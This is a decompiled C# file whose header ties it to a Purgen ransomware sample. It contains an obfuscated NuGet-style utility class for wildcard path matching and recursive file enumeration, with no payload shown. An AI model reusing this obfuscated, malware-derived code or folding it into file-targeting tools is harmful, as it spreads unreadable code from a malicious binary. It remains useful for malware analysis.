// Decompiled with JetBrains decompiler
// Type: NuGet.Common.lvwr71aXVK
// Assembly: Ty6CWyxFEL, Version=5.0.0.2, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 271E2DAF-741A-443A-8BCF-B62C509DDC38
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Ransom.MSIL.Purgen.gen-185fafbeb00cd8238fdabee088763e27012dd3a0076e04dddca6266f129f0430.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace NuGet.Common
{
  public static class lvwr71aXVK
  {
    public static IEnumerable<T> XJJU3J36Yp<T>(
      IEnumerable<T> AZBJngX3Qc,
      Func<T, string> KF1nZHD2W1,
      IEnumerable<string> leyKKX7hcw)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: reference to a compiler-generated method
      return AZBJngX3Qc.Where<T>(new Func<T, bool>(new lvwr71aXVK.\u0030vavgFz68e<T>()
      {
        getPath = KF1nZHD2W1,
        filters = leyKKX7hcw.Select<string, Regex>(new Func<string, Regex>(lvwr71aXVK.b7DqWw58E4))
      }.\u003CGetMatches\u003Eb__0));
    }

    public static void IrzhEaPU6z<T>(
      ICollection<T> IG618IxCXp,
      Func<T, string> HndAjpxhEJ,
      IEnumerable<string> PaodyEmU63)
    {
      lvwr71aXVK.dJacbiXPZr<T>(IG618IxCXp, HndAjpxhEJ, PaodyEmU63);
    }

    public static IEnumerable<T> dJacbiXPZr<T>(
      ICollection<T> _param0,
      Func<T, string> epG1o4ScR5,
      IEnumerable<string> VEdPEhW0sg)
    {
      HashSet<T> objSet = new HashSet<T>(lvwr71aXVK.XJJU3J36Yp<T>((IEnumerable<T>) _param0, epG1o4ScR5, VEdPEhW0sg));
      IList<T> list = (IList<T>) _param0.Where<T>(new Func<T, bool>(objSet.Contains)).ToList<T>();
      foreach (T obj in (IEnumerable<T>) list)
        _param0.Remove(obj);
      return (IEnumerable<T>) list;
    }

    public static string \u0035IoCpDosUk(string _param0, string OjRlyhrw24)
    {
      if (OjRlyhrw24.StartsWith("**", StringComparison.OrdinalIgnoreCase))
        return OjRlyhrw24;
      _param0 = lvwr71aXVK.zv02g9DVyB(_param0, ref OjRlyhrw24);
      return Path.Combine(_param0, OjRlyhrw24);
    }

    private static Regex b7DqWw58E4(string uomk1GEybX)
    {
      string str = Regex.Escape(uomk1GEybX);
      return new Regex("^" + (Path.DirectorySeparatorChar != '/' ? str.Replace("/", "\\\\").Replace("\\.\\*\\*", "\\.[^\\\\.]*").Replace("\\*\\*\\\\", "(.+\\\\)*").Replace("\\*\\*", ".*").Replace("\\*", "[^\\\\]*(\\\\)?").Replace("\\?", ".") : str.Replace("\\.\\*\\*", "\\.[^/.]*").Replace("\\*\\*/", "(.+/)*").Replace("\\*\\*", ".*").Replace("\\*", "[^/]*(/)?").Replace("\\?", ".")) + "$", RegexOptions.IgnoreCase | RegexOptions.ExplicitCapture);
    }

    public static IEnumerable<string> fkSmdtyQWl(string whTp7Kqe5c, string VQRU7jQcsY) => lvwr71aXVK.USyhugwRyJ(whTp7Kqe5c, VQRU7jQcsY, false, out string _).Select<lvwr71aXVK.\u0035StZ0Gwx9C, string>((Func<lvwr71aXVK.\u0035StZ0Gwx9C, string>) (Z8vUud6WHU => Z8vUud6WHU.wOghWFaVZy));

    public static IEnumerable<lvwr71aXVK.\u0035StZ0Gwx9C> USyhugwRyJ(
      string IjlQlULXWS,
      string ZiopefbtFb,
      bool Aw6rOPg8yV,
      out string _param3)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      lvwr71aXVK.\u00362TbHrXhTg obj = new lvwr71aXVK.\u00362TbHrXhTg();
      bool flag1 = false;
      if (lvwr71aXVK.ZoYdYPfyHg(ZiopefbtFb))
      {
        ZiopefbtFb = ZiopefbtFb + "**" + Path.DirectorySeparatorChar.ToString() + "*";
        flag1 = true;
      }
      IjlQlULXWS = lvwr71aXVK.zv02g9DVyB(IjlQlULXWS, ref ZiopefbtFb);
      _param3 = lvwr71aXVK.UQqrgCsmTO(IjlQlULXWS, ZiopefbtFb);
      // ISSUE: reference to a compiler-generated field
      obj.TWFzOPyQQU = lvwr71aXVK.b7DqWw58E4(Path.Combine(IjlQlULXWS, ZiopefbtFb));
      SearchOption searchOption = SearchOption.AllDirectories;
      int num = ZiopefbtFb.IndexOf("**", StringComparison.OrdinalIgnoreCase) != -1 ? 1 : 0;
      bool flag2 = Path.GetDirectoryName(ZiopefbtFb).Contains<char>('*');
      if (num == 0 && !flag2)
        searchOption = SearchOption.TopDirectoryOnly;
      // ISSUE: reference to a compiler-generated method
      IEnumerable<lvwr71aXVK.\u0035StZ0Gwx9C> first = ((IEnumerable<string>) Directory.GetFiles(_param3, "*.*", searchOption)).Where<string>(new Func<string, bool>(obj.FA7XzPkkFH)).Select<string, lvwr71aXVK.\u0035StZ0Gwx9C>((Func<string, lvwr71aXVK.\u0035StZ0Gwx9C>) (jjBfHUs215 => new lvwr71aXVK.\u0035StZ0Gwx9C(jjBfHUs215, true)));
      if (!Aw6rOPg8yV)
        return first;
      // ISSUE: reference to a compiler-generated method
      IEnumerable<lvwr71aXVK.\u0035StZ0Gwx9C> objs = ((IEnumerable<string>) Directory.GetDirectories(_param3, "*.*", searchOption)).Where<string>(new Func<string, bool>(obj.\u0035LF1sPfyXu)).Select<string, lvwr71aXVK.\u0035StZ0Gwx9C>((Func<string, lvwr71aXVK.\u0035StZ0Gwx9C>) (_param1 => new lvwr71aXVK.\u0035StZ0Gwx9C(_param1, false)));
      if (flag1 && lvwr71aXVK.\u0037W3V1jelwa(_param3))
        objs = objs.Concat<lvwr71aXVK.\u0035StZ0Gwx9C>((IEnumerable<lvwr71aXVK.\u0035StZ0Gwx9C>) new lvwr71aXVK.\u0035StZ0Gwx9C[1]
        {
          new lvwr71aXVK.\u0035StZ0Gwx9C(_param3, false)
        });
      return first.Concat<lvwr71aXVK.\u0035StZ0Gwx9C>(objs);
    }

    internal static string UQqrgCsmTO(string slE6MhDYBg, string MWibinO3ya)
    {
      int startIndex = MWibinO3ya.IndexOf('*');
      string str;
      if (startIndex == -1)
      {
        string directoryName = Path.GetDirectoryName(MWibinO3ya);
        str = Path.Combine(slE6MhDYBg, directoryName);
      }
      else
      {
        int length = MWibinO3ya.LastIndexOf(Path.DirectorySeparatorChar, startIndex);
        if (length == -1)
        {
          str = slE6MhDYBg;
        }
        else
        {
          string path2 = MWibinO3ya.Substring(0, length);
          str = Path.Combine(slE6MhDYBg, path2);
        }
      }
      return str;
    }

    internal static string zv02g9DVyB(string LIC8YKc9qZ, ref string _param1)
    {
      string path2 = string.Format("..{0}", (object) Path.DirectorySeparatorChar);
      string str = string.Format(".{0}", (object) Path.DirectorySeparatorChar);
      LIC8YKc9qZ = string.IsNullOrEmpty(LIC8YKc9qZ) ? str : LIC8YKc9qZ;
      while (_param1.StartsWith(path2, StringComparison.OrdinalIgnoreCase))
      {
        LIC8YKc9qZ = Path.Combine(LIC8YKc9qZ, path2);
        _param1 = _param1.Substring(path2.Length);
      }
      return Path.GetFullPath(LIC8YKc9qZ);
    }

    public static bool bd3Jbtcsee(string M1HXbtwGbg) => M1HXbtwGbg.IndexOf('*') != -1;

    public static bool ZoYdYPfyHg(string xQzaCnUaJd)
    {
      if (xQzaCnUaJd == null || xQzaCnUaJd.Length <= 1)
        return false;
      return (int) xQzaCnUaJd[xQzaCnUaJd.Length - 1] == (int) Path.DirectorySeparatorChar || (int) xQzaCnUaJd[xQzaCnUaJd.Length - 1] == (int) Path.AltDirectorySeparatorChar;
    }

    private static bool \u0037W3V1jelwa(string gOGJXjHnac) => !Directory.EnumerateFileSystemEntries(gOGJXjHnac).Any<string>();

    public struct \u0035StZ0Gwx9C
    {
      private readonly string TH2ezPknBf;
      private readonly bool mJEKRQEjef;

      public string wOghWFaVZy => this.TH2ezPknBf;

      public bool UNpkBj49fa => this.mJEKRQEjef;

      public \u0035StZ0Gwx9C(string path, bool isFile)
      {
        this.TH2ezPknBf = path;
        this.mJEKRQEjef = isFile;
      }
    }
  }
}
